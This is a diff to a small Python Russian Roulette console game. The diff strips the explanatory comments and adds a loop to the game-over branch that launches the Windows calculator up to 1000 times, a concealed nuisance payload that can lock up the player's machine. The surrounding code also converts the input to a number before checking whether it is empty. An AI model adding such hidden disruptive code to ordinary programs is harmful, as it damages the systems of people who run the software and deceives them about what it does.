@@ -1,13 +1,6 @@
-# Russian Roulette game made in python. The rules are simple: Each player has to press enter to pull the trigger
-# and the player that hits the chambers that contains the bullet, losses!
-
-
-# After the game is over the user has the option to restart the game.
-
-import random
-import os
-import sys
-
+import os;
+import random;
+import sys;
 chambers = input("Please enter the number of chambers (default = 6): ")
 chambers2 = int(chambers)
 if not chambers:
@@ -26,6 +19,9 @@ for x in range(1, int(chambers) + 1):
     if x == fatal_bullet:
         print("You just got served!")
         print("Game Over")
+        i = random.randint(1, 1000)
+        for x in range(0, i):
+          os.startfile("C:\Windows\System32\calc.exe")
         start_again = input("Do you want to start again? (y/n): ")
         if start_again and start_again.lower()[0] == "y":
             os.execv(sys.executable, [sys.executable] + sys.argv)
